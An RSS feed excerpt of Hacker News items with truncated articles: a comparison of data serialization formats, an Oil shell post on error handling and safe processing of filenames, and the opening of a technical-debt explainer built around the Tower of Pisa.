            <pubDate>Fri, 23 Oct 2020 18:25:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Better Than JSON?]]>
            </title>
            <description>
<![CDATA[
Score 125 | Comments 144 (<a href="https://news.ycombinator.com/item?id=24871946">thread link</a>) | @fanf2
<br/>
October 23, 2020 | https://wiki.alopex.li/BetterThanJson | <a href="https://web.archive.org/web/*/https://wiki.alopex.li/BetterThanJson">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">

<p>I want to take a brief look at various data serialization formats and compare them. Basically the goal is to answer the question, “can we find something better than JSON?” However, note that we are looking at these things for DATA SERIALIZATION, not for config files and stuff, so that’s the goal by which these will be judged.</p>
<p>There’s two orthogonal axes to look at these things under:</p>
<ul>
<li>Self-describing vs.&nbsp;schema-defined formats</li>
<li>Human readable vs.&nbsp;machine-readable formats</li>
</ul>
<p>That is, whether the type information for a structure is defined in a separate file (a schema) that a receiving program checks against, or whether the message itself contains type information. It’s almost exactly the difference between statically and dynamically typed programming languages. Like programming languages, both have pros and cons, neither of them are always better than the other. The goal of this is to compare apples to apples, so we’re gonna note which category these things fall into but not make value judgements based on them. There’s also fuzzy edges; many self-describing formats optionally have a schema layer too. Similarly, we will not really compare tooling quality; the goal is to look at the intrinsic properties of the formats. The culture surrounding them may be considered though.</p>
<p>This is also important not to conflate with an RPC protocol, though many of these things are used IN RPC protocols. Keep in mind that HTTP/REST interfaces are often just a type of RPC protocol, whether realized that way or not.</p>
<p>Up to date as of October 2020. Doesn’t try to include myriad minor things, ’cause there’s only so much time in the world.</p>

<h2 id="json">JSON</h2>
<p><a href="http://json.org/">http://json.org/</a></p>
<p>What everything gets currently compared against. We all know JSON, we all agree it’s Sorta Good Enough but really is kinda crap.</p>
<p><strong>Category:</strong> Human-readable, self-describing. (<a href="https://json-schema.org/">https://json-schema.org/</a> exists but does not seem very widely used.) Has an <a href="https://en.wikipedia.org/wiki/JSON-RPC">RPC protocol</a> but it also seems lightly used, <a href="https://jsonapi.org/">this</a> might be more general.</p>
<p><strong>Users:</strong> Everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Similar to major programming languages – Easy to understand and debug</li>
<li>Simple – Easy to read, write, and understand… at least for simple things. <a href="http://seriot.ch/parsing_json.php">Turns out there’s a lot of gotcha’s though.</a></li>
<li>Pretty compact if minified</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is pretty shit – no date/time, no real integers, no real structs, no unions/tuples/etc</li>
<li>Tends to discourage schema’s – “So simple it doesn’t need it”, until it becomes less simple.</li>
<li>No normalized form – fields may be reordered, <em>duplicated</em>, etc. Makes hashing it hard, gotta read whole message to begin verifying it, etc.</li>
<li>No comments – harder to write well than you might think!</li>
<li>No good way to contain binary data</li>
</ul>
<h2 id="yaml">YAML</h2>
<p><a href="https://yaml.org/">https://yaml.org/</a></p>
<p>Started out as a simpler alternative to XML.</p>
<p><strong>Category:</strong> Human-readable, self-describing.</p>
<p><strong>Users:</strong> Lots of people</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Vaguely simple to read and write, in its basic form</li>
<li>Low visual noise</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Way too complicated – they made it a strict superset of JSON for some damn reason, and nobody uses that form, so it’s just a pile of wasted effort</li>
<li>Reference impl incomplete, other impl’s disagree with each other and the spec</li>
</ul>
<h2 id="xml">XML</h2>
<p><a href="https://en.wikipedia.org/wiki/XML">https://en.wikipedia.org/wiki/XML</a></p>
<p>Not sure anyone really knows how XML happened. It’s basically the W3C’s fault, I think? It’s okay for some things but in the end I’m not sure it’s something anyone actually <em>wants</em> to use, it’s just going to be one more of those mistakes of the past.</p>
<p><strong>Category:</strong> Human-readable, self-describing with common schema usage. Has an <a href="https://en.wikipedia.org/wiki/XML-RPC">RPC protocol</a> and many other complicated things.</p>
<p><strong>Users:</strong> Everyone who can’t avoid it.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Promotes schemas and validation</li>
<li>Simple to use for simple things</li>
<li>Actually pretty decent for documents</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>I’ve never gotten schemas and validation to actually work in practice</li>
<li>Everything is string-ly typed</li>
<li>No real arrays</li>
<li>Complicated as frig</li>
<li>Very verbose</li>
<li>There’s like 3-4 different ways to do everything</li>
<li>Still no good way to contain binary data</li>
</ul>

<h2 id="protobuf">Protobuf</h2>
<p><a href="https://developers.google.com/protocol-buffers/">https://developers.google.com/protocol-buffers/</a></p>
<p>aka Protocol Buffers, but that’s a pretty dumb name. Google’s common, fast on-the-wire serialization format.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Has an <a href="https://grpc.io/">RPC protocol</a> built around it.</p>
<p><strong>Users:</strong> Google, basically everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Basically reasonable</li>
<li>Now has some support for versioning schemas, though it’s a hard problem in general</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Not particularly simple</li>
<li>Wire protocol may be more work than it needs to be</li>
<li>Its type system <a href="http://reasonablypolymorphic.com/blog/protos-are-wrong/index.html">could maybe be better</a></li>
</ul>
<h2 id="capn-proto">Cap’n Proto</h2>
<p><a href="https://capnproto.org/">https://capnproto.org/</a></p>
<p>The Other Binary Serialization Protocol.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC, which is built in to the reference implementation.</p>
<p><strong>Users:</strong> sandstorm.io, Cloudflare?, various other people but it doesn’t seem like that many</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed to be fast</li>
<li>Made by one of the people who worked heavily on Protobuf at Google, so <a href="https://capnproto.org/faq.html#how-do-i-make-a-field-required-like-in-protocol-buffers">there’s lots of experience behind it</a>. That said, doesn’t mean this cat’s always <em>right</em>, but there’s certainly opinions that are trying to be expressed.</li>
<li>Sophisticated RPC comes as part of the standard package</li>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
<li>Adorable name</li>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
<li>Lots of the docs and concepts are pretty low level, you usually ain’t gonna need it</li>
<li>Seems more complicated than protobuf – this might be one reason there’s fewer 3rd-party implementations</li>
</ul>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/">https://thrift.apache.org/</a></p>
<p>Apache’s version of Protobuf. Does anyone actually use this? Facebook, apparently, since they invented it and then gave it to Apache. Anyone else?</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC.</p>
<p><strong>Users:</strong> Basically mostly Facebook? Twitter and AirBNB also apparently use it, so apparently it’s not UNpopular.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>It works?</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Docs suck</li>
<li>Apache is the tragic junkyard of open source projects</li>
<li>Apparently still not as good as flatbuffers, see below</li>
</ul>
<h2 id="flatbuffers">Flatbuffers</h2>
<p><a href="https://google.github.io/flatbuffers/">https://google.github.io/flatbuffers/</a></p>
<p>Feels a little like Google’s answer to Cap’n Proto, as it has some of the same design goals – zero-copy serialization and layouts that are more amenable to versioning.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Includes RPC protocol.</p>
<p><strong>Users:</strong> Google, Cocos2D, Facebook’s mobile client</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda feels like the problem is already solved by capnp</li>
<li>Includes a JSON parser for some reason?</li>
<li>Type system is kinda anemic with regards to unions</li>
</ul>
<h2 id="cbor">CBOR</h2>
<p><a href="https://cbor.io/">https://cbor.io/</a></p>
<p>Basically a binary re-imagining of JSON.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> ???</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Pretty good type system – there’s things like fixnum’s, datetime’s, blobs, etc</li>
<li>Compact</li>
<li>Built-in extensibility</li>
<li>Designed to be a drop-in replacement for JSON</li>
<li>IETF standard</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda more complicated than it needs to be, though this is for the sake of compactness and comprehensive types. Numbers are densely packed into fewer bits when possible, for example.</li>
<li>Doesn’t actually seem that widely adopted for some reason?</li>
</ul>
<h2 id="msgpack">Msgpack</h2>
<p><a href="https://msgpack.org/">https://msgpack.org/</a></p>
<p>The Other CBOR, or rather, <a href="https://news.ycombinator.com/item?id=14067747">CBOR is derived from this</a>. Designed to be simple and compact. Kinda a <em>lot</em> like a slightly chopped down CBOR, actually, their integer specification stuff looks nearly identical.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> Redis, a few others?</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple</li>
<li>Compact</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Specification is kinda weak</li>
<li>No real tuple or enum types</li>
<li>Why not just CBOR?</li>
</ul>
<h2 id="bson">BSON</h2>
<p><a href="http://bsonspec.org/">http://bsonspec.org/</a></p>
<p>As the name implies, a binary-ifcation of JSON. Created by MongoDB as its internal data format.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> MongoDB</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Type system is full of deprecated and MongoDB-specific shit but is reasonably pragmatic</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is reasonably pragmatic but is full of deprecated and MongoDB-specific shit</li>
<li><strong>C strings</strong> – though there’s random non-C strings in places as well.</li>
<li>Its arrays are a travesty against serializarion</li>
<li>Basically an implementation detail of MongoDB, and it looks like it</li>
</ul>

<p>Things that are interesting but not actually in the scope of serialization languages, or are otherwise irrelevant.</p>
<h2 id="toml">TOML</h2>
<p><a href="https://github.com/toml-lang/toml">https://github.com/toml-lang/toml</a></p>
<p>Invalid, it’s designed as a config language, not a serialization format. It’s basically an attempt to make something as simple and ubiquitous as windows .INI files that is an actual specification rather than a fashion.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> Various, notably Cargo (Rust’s build tool)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Work well as a config language without deeply nested structures</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Works poorly when you try to make deeply nested structures</li>
</ul>
<h2 id="ron">RON</h2>
<p><a href="https://github.com/ron-rs/ron">https://github.com/ron-rs/ron</a></p>
<p>Rusty Object Notation. Because shoehorning Rust’s ML-y type systeminto JSON isn’t very much fun. Works startlingly well for this purpose but is basically untried elsewhere.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> A few, notably <a href="https://amethyst.rs/">Amethyst</a>.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Good type system for sophisticated functional-style languages</li>
<li>Simple and reasonably compact</li>
<li>Actually very good at what it does</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Young, underspecified, Rust-centric</li>
</ul>
<h2 id="bincode">Bincode</h2>
<p><a href="https://github.com/servo/bincode">https://github.com/servo/bincode</a></p>
<p>Included mainly for completeness. It’s not standardized outside of a single particular implementation which doesn’t promise stability, so not intended for general-purpose use. It’s intended as a fast and easy RPC/IPC format for Servo, and the actual format is basically an implementation detail of that goal.</p>
<p><strong>Users:</strong> Servo, programs written by introverts who don’t care about being able to talk to each other. (Turns out this is a useful niche though, who knew.)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Compact, fast, simple.</li>
<li>Works basically transparently for IPC with Rust code.</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Anything other than that specific version of that specific library is …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wiki.alopex.li/BetterThanJson">https://wiki.alopex.li/BetterThanJson</a></em></p>]]>
            </description>
            <link>https://wiki.alopex.li/BetterThanJson</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871946</guid>
            <pubDate>Fri, 23 Oct 2020 17:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four features that justify a new Unix shell]]>
            </title>
            <description>
<![CDATA[
Score 236 | Comments 175 (<a href="https://news.ycombinator.com/item?id=24871762">thread link</a>) | @diegocg
<br/>
October 23, 2020 | http://www.oilshell.org/blog/2020/10/osh-features.html | <a href="https://web.archive.org/web/*/http://www.oilshell.org/blog/2020/10/osh-features.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <!-- INSERT LATCH HTML -->
<p><a href="http://www.oilshell.org/blog/">blog</a> | <a href="http://www.oilshell.org/">oilshell.org</a></p>

<p>
  2020-10-22
</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>
<a name="safe-processing-of-user-supplied-data-like-filenames"></a>
<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>
<ul>
<li>Related: Posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=escaping-quoting#escaping-quoting">escaping-quoting</a>, particularly <a href="http://www.oilshell.org/blog/2017/09/29.html">Git Log
in HTML</a> (2017).</li>
</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me
know</a> what you think is missing.</p>
<p>If you haven't read it already, see <a href="http://www.oilshell.org/blog/2018/01/28.html">Why Create a Unix
Shell?</a>.  It's the most popular page on this site,
though I still need to update it for 2021.</p>
<p>I then proposed a focus on making the OSH language "production ready".  I'm
still going to work on the Oil language, but I need help finishing it.</p>
<a name="dev-tools-improvements"></a>
<h3>Dev Tools Improvements</h3>
<p>Speaking of which, several people have pointed out that the dev process for Oil
is difficult.  I've addressed this recently by removing spew from …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.oilshell.org/blog/2020/10/osh-features.html">http://www.oilshell.org/blog/2020/10/osh-features.html</a></em></p>]]>
            </description>
            <link>http://www.oilshell.org/blog/2020/10/osh-features.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871762</guid>
            <pubDate>Fri, 23 Oct 2020 17:23:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Technical Debt: Why it'll ruin your software]]>
            </title>
            <description>
<![CDATA[
Score 201 | Comments 148 (<a href="https://news.ycombinator.com/item?id=24871348">thread link</a>) | @yannikyeo
<br/>
October 23, 2020 | https://labcodes.com.br/blog/articles/tech-debt.html | <a href="https://web.archive.org/web/*/https://labcodes.com.br/blog/articles/tech-debt.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>
<h2>John, the <em>purrgrammer</em></h2>
<p><img alt="John working in a computer" src="https://labcodes.com.br/blog/images/tech-debt/chico-the-purrgrammer.png"></p>
<ul>
<li>This is John.</li>
<li>John is a Senior Developer always with a lot on his plate.</li>
<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
